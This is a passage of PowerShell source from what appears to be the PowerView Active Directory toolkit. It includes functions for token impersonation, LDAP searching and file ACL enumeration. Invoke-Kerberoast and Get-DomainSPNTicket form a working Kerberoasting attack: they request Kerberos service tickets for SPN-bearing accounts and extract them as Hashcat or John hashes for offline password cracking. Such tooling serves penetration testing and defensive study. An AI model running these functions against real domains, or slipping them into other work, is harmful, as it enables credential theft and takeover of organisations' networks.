License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetCancelConnection2 to destroy a connection created by
New-RemoteConnection. If a -Path isn't specified, a -ComputerName is required to
'unmount' \\$ComputerName\IPC$.

.PARAMETER ComputerName

Specifies the system to remove a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to remove the connection for.

.EXAMPLE

Remove-RemoteConnection -ComputerName 'PRIMARY.testlab.local'

.EXAMPLE

Remove-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\'

.EXAMPLE

@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Remove-RemoteConnection
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Invoke-UserImpersonation {
<#
.SYNOPSIS

Creates a new "runas /netonly" type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate "runas /netonly". The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate "runas.exe /netonly" functionality
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # actually impersonate the token from LogonUser()
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    $LogonTokenHandle
}


function Invoke-RevertToSelf {
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function Get-DomainSPNTicket {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()

            # get simple permission
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            # get remaining extended permissions
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        # map IPC$ to this computer if it's not already
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = Get-Acl -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $TargetPath
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $_"
            }
        }
    }

    END {
        # remove the IPC$ mappings
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {
<#
.SYNOPSIS

Helper that converts specific LDAP property result fields and outputs
a custom psobject.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Domain* function.

.PARAMETER Properties

Properties object to extract out LDAP fields for display.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with LDAP hashtable properties translated.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # convert all listed sids (i.e. if multiple are listed in sidHistory)
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                # convert the GUID to a string
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # convert timestamps
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    # if we have a System.__ComObject
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    # otherwise just a string
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # try to convert misc com objects
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Get-DomainSearcher {
<#
.SYNOPSIS

Helper used by various functions that builds a custom AD searcher object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain  

.DESCRIPTION

Takes a given domain and a number of customizations and returns a
System.DirectoryServices.DirectorySearcher object. This function is used
heavily by other LDAP/ADSI searcher functions (Verb-Domain*).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER SearchBasePrefix

Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local

Return a searcher for all objects in testlab.local.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'

Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.

.EXAMPLE

Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).

.OUTPUTS

System.DirectoryServices.DirectorySearcher
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                # see if we can grab the user DNS logon domain from environment variables
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            # see if we can grab the user DNS logon domain from environment variables
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            # otherwise, resort to Get-Domain to retrieve the current domain object
            write-verbose "get-domain"
            $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters['Server']) {
            # if there's not a specified server to bind to, try to pull a logon server from ENV variables
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                # if we're searching the global catalog, get the path in the right format
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            # transform the target domain name into a distinguishedName if an ADS search base is not specified
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # bind to the inital search object using alternate credentials
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # bind to the inital object using the current credentials
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

